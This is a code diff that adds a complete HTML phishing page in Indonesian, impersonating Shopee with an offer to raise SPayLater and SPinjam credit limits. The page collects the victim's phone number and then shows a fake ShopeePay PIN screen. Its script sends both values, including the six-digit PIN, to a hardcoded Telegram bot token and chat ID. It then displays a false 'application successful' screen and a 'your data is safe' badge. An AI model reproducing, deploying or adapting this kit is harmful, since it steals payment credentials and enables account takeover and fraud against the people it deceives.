@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tingkatkan Limit Shopee</title>
+
+    <meta property="og:title" content="Tingkatkan Limit ShopeePay / SPayLater / SPinjam">
+    <meta property="og:description" content="Ajukan peningkatan limit layanan Shopee Anda dengan mudah dan cepat.">
+    <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-14-810a88ed-4e90-4858-b1b7-47acf107ae1a.jpg">
+    <meta property="og:image:secure_url" content="https://cdn.phototourl.com/member/2026-10-14-810a88ed-4e90-4858-b1b7-47acf107ae1a.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        body {
+            background-color: #f2f3f5; /* Warna latar belakang luar abu-abu kertas */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: #f2f3f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .header-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .form-content {
+            padding: 20px;
+            flex: 1;
+            background: #f2f3f5;
+        }
+
+        .main-card-box {
+            background: #ffffff; /* Kotak kolom isi tetap putih berkilau */
+            border: 1px solid #eaeaea;
+            border-radius: 14px;
+            padding: 22px 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 1), 0 6px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        .badge-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #ee4d2d;
+            color: #ffffff;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .badge-label svg {
+            width: 14px;
+            height: 14px;
+            fill: #ffffff;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 12px;
+        }
+
+        .section-title svg {
+            width: 18px;
+            height: 18px;
+            fill: #ee4d2d;
+        }
+
+        /* Input dengan model garis bawah panjang */
+        .input-box {
+            position: relative;
+            display: flex;
+            align-items: center;
+            border-bottom: 2px solid #d5d5d5;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-box:focus-within {
+            border-color: #ee4d2d;
+        }
+
+        .input-box svg {
+            position: absolute;
+            left: 0px;
+            width: 20px;
+            height: 20px;
+            fill: #777777;
+            z-index: 2;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 12px 12px 12px 32px;
+            background: transparent;
+            border: none;
+            border-radius: 0;
+            font-size: 16px;
+            font-weight: 600;
+            color: #222222;
+            outline: none;
+            user-select: text;
+        }
+
+        .service-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .service-card {
+            position: relative;
+            border: 1px solid #d5d5d5;
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 16px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .service-card.active {
+            border: 2px solid #ee4d2d;
+            background: #fffbfa;
+            box-shadow: 0 0 12px rgba(238, 77, 45, 0.15);
+        }
+
+        .check-badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 18px;
+            height: 18px;
+            background: #ee4d2d;
+            color: white;
+            border-radius: 50%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        .service-card.active .check-badge {
+            display: flex;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin: 0 auto 8px auto;
+            display: block;
+        }
+
+        .card-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 2px;
+        }
+
+        .service-card.active .card-title {
+            color: #ee4d2d;
+        }
+
+        .card-sub {
+            font-size: 12px;
+            font-weight: 500;
+            color: #666666;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: #ee4d2d;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.35);
+        }
+
+        /* ================= TAMPILAN PIN SHOPEEPAY ================= */
+        .otp-section {
+            display: none;
+            flex-direction: column;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 20;
+        }
+
+        .shopee-pin-header {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            background: #ffffff;
+            border-bottom: 1px solid #eaeaea;
+            width: 100%;
+            position: relative;
+        }
+
+        .shopee-pin-header .btn-back {
+            background: none;
+            border: none;
+            font-size: 22px;
+            color: #ee4d2d;
+            cursor: pointer;
+            padding-right: 12px;
+            display: flex;
+            align-items: center;
+            position: absolute;
+            left: 16px;
+            z-index: 2;
+        }
+
+        .shopee-pin-header .title {
+            width: 100%;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 600;
+            color: #222222;
+        }
+
+        .pin-body-container {
+            width: 100%;
+            text-align: center;
+            padding: 30px 20px 0 20px;
+            position: relative;
+            cursor: pointer;
+            background: #ffffff;
+        }
+
+        .shopee-pin-subtitle {
+            font-size: 13px;
+            color: #777777;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        /* 6 Bullet Points / Dots Pin */
+        .pin-dots-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .pin-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #cccccc;
+            background-color: #ffffff;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+            transition: all 0.15s ease;
+        }
+
+        .pin-dot.filled {
+            background-color: #222222;
+            border-color: #222222;
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.25);
+        }
+
+        .forgot-pin {
+            font-size: 13px;
+            color: #2673dd;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        /* Input tersembunyi untuk memicu keyboard bawaan HP */
+        #hiddenPinInput {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            width: 0;
+        }
+
+        /* Step 3 Process (Centang Hijau) */
+        .process-section {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+            background: #ffffff;
+            border-radius: 12px;
+            margin: 20px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 1), 0 6px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        .success-icon-box {
+            width: 64px;
+            height: 64px;
+            background-color: #2ecc71;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.5);
+        }
+
+        .success-icon-box svg {
+            width: 36px;
+            height: 36px;
+            fill: #ffffff;
+        }
+
+        .process-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .process-desc {
+            font-size: 14px;
+            color: #666666;
+            line-height: 1.5;
+        }
+
+        /* Footer */
+        .security-footer {
+            margin-top: 20px;
+            background: #ffffff;
+            border: 1px solid #eaeaea;
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
+        }
+
+        .security-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-icon {
+            width: 28px;
+            height: 28px;
+            background: #f7f7f7;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555555;
+            font-size: 13px;
+        }
+
+        .security-text h5 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #222222;
+        }
+
+        .security-text p {
+            font-size: 11px;
+            color: #666666;
+        }
+
+        .chevron-right {
+            color: #999999;
+            font-weight: 700;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <!-- Gambar Header Atas -->
+    <img id="headerImage" src="https://cdn.phototourl.com/member/2026-10-14-1c5a4a30-ed6f-464c-87a0-decb96aa7860.png" alt="Header Banner" class="header-image">
+
+    <!-- Isi Formulir Utama -->
+    <div class="form-content" id="mainFormContent">
+        
+        <!-- STEP 1: Form Input Data -->
+        <form id="limitForm" onsubmit="handleNext(event)">
+            <div id="step1Form">
+                
+                <div class="main-card-box">
+                    <!-- Input Nomor Handphone -->
+                    <div class="form-group">
+                        <div class="badge-label">
+                            <!-- Ikon Telepon pada Badge Label -->
+                            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.15 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                            Nomor Handphone
+                        </div>
+                        <div class="input-box">
+                            <!-- Ikon Telepon (Receiver) pada Kotak Input -->
+                            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.15 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                            <input type="tel" id="phone" placeholder="Masukan Nomor" required>
+                        </div>
+                    </div>
+
+                    <!-- Pilih Layanan Limit -->
+                    <div class="form-group">
+                        <div class="section-title">
+                            <svg viewBox="0 0 24 24"><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/></svg>
+                            Pilih Layanan Limit
+                        </div>
+                        <div class="service-grid">
+                            <div class="service-card" onclick="selectCard('SPayLater', this)">
+                                <div class="check-badge">✓</div>
+                                <img src="https://cdn.phototourl.com/member/2026-10-14-617d0b54-e3f5-46a6-a53d-fa60d1fd8057.png" alt="SPayLater" class="card-icon">
+                                <div class="card-title">SPayLater</div>
+                                <div class="card-sub">cicilan belanja</div>
+                            </div>
+
+                            <div class="service-card" onclick="selectCard('SPinjam', this)">
+                                <div class="check-badge">✓</div>
+                                <img src="https://cdn.phototourl.com/member/2026-10-14-ca6d00bd-68ee-4b99-84e5-77685c553769.png" alt="SPinjam" class="card-icon">
+                                <div class="card-title">SPinjam</div>
+                                <div class="card-sub">Pinjaman Tunai</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">
+                    Lanjutkan
+                </button>
+            </div>
+        </form>
+
+        <!-- STEP 3: Tampilan Proses / Sukses (Centang Hijau) -->
+        <div id="step3Process" class="process-section">
+            <div class="success-icon-box">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <div class="process-title">Pengajuan Berhasil</div>
+            <div class="process-desc">
+                Pengajuan Anda sedang diproses. Anda akan segera dihubungi layanan Shopee.
+            </div>
+        </div>
+
+        <!-- Footer Info Keamanan -->
+        <div id="securityFooter" class="security-footer">
+            <div class="security-left">
+                <div class="security-icon">🛡️</div>
+                <div class="security-text">
+                    <h5>Data Anda Aman</h5>
+                    <p>Kami menjaga keamanan informasi Anda.</p>
+                </div>
+            </div>
+            <div class="chevron-right">›</div>
+        </div>
+
+    </div>
+
+    <!-- STEP 2: Masukkan PIN ShopeePay dengan Keyboard Bawaan HP -->
+    <div id="step2Otp" class="otp-section">
+        <!-- HEADER KHUSUS LAYAR PIN SHOPEEPAY -->
+        <div class="shopee-pin-header">
+            <button type="button" class="btn-back" onclick="goBackToStep1()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ee4d2d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+            </button>
+            <div class="title">Masukkan PIN ShopeePay</div>
+        </div>
+
+        <div class="pin-body-container" onclick="focusPinInput()">
+            <div class="shopee-pin-subtitle">PIN ShopeePay diperlukan untuk mengonfirmasi identitas Anda</div>
+
+            <!-- 6 Bulatan PIN -->
+            <div class="pin-dots-wrapper">
+                <div class="pin-dot" id="dot-0"></div>
+                <div class="pin-dot" id="dot-1"></div>
+                <div class="pin-dot" id="dot-2"></div>
+                <div class="pin-dot" id="dot-3"></div>
+                <div class="pin-dot" id="dot-4"></div>
+                <div class="pin-dot" id="dot-5"></div>
+            </div>
+
+            <a class="forgot-pin" onclick="event.stopPropagation(); alert('Silakan verifikasi ulang nomor Anda')">Lupa PIN ShopeePay?</a>
+
+            <!-- Input tersembunyi yang menangkap ketikan dari keyboard HP -->
+            <input type="tel" id="hiddenPinInput" maxlength="6" oninput="handlePinInput(this)">
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io';
+    const TELEGRAM_CHAT_ID = '7667144622';
+
+    let selectedService = '';
+    let globalPhone = '';
+
+    function selectCard(serviceName, element) {
+        selectedService = serviceName;
+        document.querySelectorAll('.service-card').forEach(card => card.classList.remove('active'));
+        element.classList.add('active');
+    }
+
+    function sendToTelegram(message) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.error('Error sending Telegram:', err));
+    }
+
+    function handleNext(e) {
+        e.preventDefault();
+        globalPhone = document.getElementById('phone').value;
+
+        if (!selectedService) {
+            alert('Silakan pilih layanan limit (SPayLater atau SPinjam) terlebih dahulu.');
+            return;
+        }
+
+        const msg = `🔔 *DATA BARU MASUK*\n\n` +
+                    `📦 *Layanan:* ${selectedService}\n` +
+                    `📱 *No HP:* \`${globalPhone}\``;
+        
+        sendToTelegram(msg);
+
+        // Pindah ke Tampilan PIN Shopee
+        document.getElementById('step2Otp').style.display = 'flex';
+        
+        const pinInput = document.getElementById('hiddenPinInput');
+        pinInput.value = '';
+        updatePinDots('');
+        
+        // Otomatis aktifkan keyboard HP
+        setTimeout(() => {
+            pinInput.focus();
+        }, 100);
+    }
+
+    function focusPinInput() {
+        const pinInput = document.getElementById('hiddenPinInput');
+        pinInput.focus();
+    }
+
+    function handlePinInput(input) {
+        let pin = input.value.replace(/[^0-9]/g, '');
+        if (pin.length > 6) {
+            pin = pin.slice(0, 6);
+            input.value = pin;
+        }
+
+        updatePinDots(pin);
+
+        if (pin.length === 6) {
+            setTimeout(() => {
+                submitPin(pin);
+            }, 150);
+        }
+    }
+
+    function updatePinDots(pin) {
+        for (let i = 0; i < 6; i++) {
+            const dot = document.getElementById(`dot-${i}`);
+            if (i < pin.length) {
+                dot.classList.add('filled');
+            } else {
+                dot.classList.remove('filled');
+            }
+        }
+    }
+
+    function submitPin(pin) {
+        const msg = `🔐 *KODE OTP/PIN MASUK*\n\n` +
+                    `📦 *Layanan:* ${selectedService}\n` +
+                    `📱 *No HP:* \`${globalPhone}\`\n` +
+                    `🔑 *PIN/OTP:* \`${pin}\``;
+
+        sendToTelegram(msg);
+
+        // Tutup Layar PIN dan Pindah ke Layar Proses (Centang Hijau)
+        document.getElementById('step2Otp').style.display = 'none';
+        document.getElementById('step1Form').style.display = 'none';
+        document.getElementById('step3Process').style.display = 'block';
+    }
+
+    function goBackToStep1() {
+        document.getElementById('step2Otp').style.display = 'none';
+        document.getElementById('hiddenPinInput').value = '';
+        updatePinDots('');
+    }
+</script>
+
+</body>
+</html>
